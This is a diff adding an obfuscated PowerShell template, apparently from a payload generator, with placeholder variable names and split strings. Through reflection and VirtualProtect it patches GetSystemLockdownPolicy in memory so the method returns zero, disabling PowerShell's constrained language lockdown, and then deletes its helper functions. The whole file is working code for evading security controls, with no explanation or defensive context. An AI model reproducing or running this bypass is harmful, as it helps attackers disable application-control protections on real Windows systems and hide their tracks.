@@ -1,0 +1,69 @@
+function >><FUNCTION1>>< {
+    Param (>><VAR1>><, >><VAR2>><)
+    >><VAR3>>< = ([AppDomain]::CurrentDomain.GetAssemblies() |
+    Where-Object {
+        $_.GlobalAssemblyCache -And $_.Location.Split(""+<><\<><+"")[-1].Equals(""+<><System.dll<><+"")
+     }).GetType("Microsoft."+<><Win32.Un<><+"safeNativeMethods")
+    >><VAR4>><=@()
+    >><VAR3>><.GetMethods() | ForEach-Object {
+        If($_.Name -like "Ge*P*oc*"+<><ddres<><+"s") {
+            >><VAR4>><+=$_
+        }
+    }
+    >><VAR12>>< = (>><VAR3>><.GetMethod(""+<><GetM<><+"odul"+<><eHan<><+"dle")).Invoke($null, @(>><VAR1>><))
+    If (>><VAR4>><[0].GetParameters()[0].ParameterType.Name -eq (""+<><HandleRef<><+"")) {
+        >><VAR12>>< = New-Object System.Runtime.InteropServices.HandleRef($null, >><VAR12>><)
+    }
+    return >><VAR4>><[0].Invoke($null, @(>><VAR12>><, >><VAR2>><))
+}
+#jump
+function >><FUNCTION2>>< {
+    Param (
+     [Parameter(Position = 0, Mandatory = $True)] [Type[]] >><VAR5>><, [Parameter(Position = 1)] [Type] >><VAR6>>< = [Void]
+    )
+    >><VAR13>>< = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
+        (New-Object System.Reflection.AssemblyName(""+<><Ref<><+"lec"+<><tedDe<><+"legate")),
+        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
+    ).DefineDynamicModule(
+        ""+<><InM<><+"emo"+<><ry<><+"Module",
+        $false
+    ).DefineType(
+        $(""+<><MyDelegateType<><+""),
+        "Class, Public, Sealed, AnsiClass, AutoClass",
+        [System.MulticastDelegate]
+    )
+
+    >><VAR13>><.DefineConstructor(
+        "RTSpecialName, HideBySig, Public",
+        [System.Reflection.CallingConventions]::Standard, >><VAR5>><
+    ).SetImplementationFlags("Runtime, Managed")
+
+    >><VAR13>><.DefineMethod(
+        "Invoke",
+        "Public, HideBySig, NewSlot, Virtual",
+        >><VAR6>><,
+        >><VAR5>><
+    ).SetImplementationFlags("Runtime, Managed")
+
+    return >><VAR13>><.CreateType()
+}
+#jump
+>><VAR7>>< = [System.Management.Automation.ScriptBlock].Assembly.GetType(""+<><System.Management.Automation.Security.SystemPolicy<><+"")
+>><VAR8>>< = >><VAR7>><.GetMethod(""+<><GetSystemLockdownPolicy<><+"", [System.Reflection.BindingFlags](""+<><Public<><+","+<><Static<><+""))
+>><VAR9>>< = >><VAR8>><.MethodHandle
+[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod(>><VAR9>><)
+[IntPtr]>><VAR10>>< = >><VAR9>><.GetFunctionPointer()
+#jump
+>><VAR11>>< = 0
+>><VAR14>>< = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+    (>><FUNCTION1>>< $(""+<><kernel32.dll<><+"") VirtualProtect),
+    (>><FUNCTION2>>< @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool]))
+)
+#jump
+>><VAR15>>< = >><VAR14>><.Invoke(>><VAR10>><, 3, 0x40, [ref]>><VAR11>><)
+>><VAR16>>< = [Byte[]] (0x29,0xc0,0xc3)
+>><VAR15>>< = [System.Runtime.InteropServices.Marshal]::Copy(>><VAR16>><, 0, >><VAR10>><, 3)
+#jump
+Remove-Item Function:>><FUNCTION2>><
+#jump
+Remove-Item Function:>><FUNCTION1>><
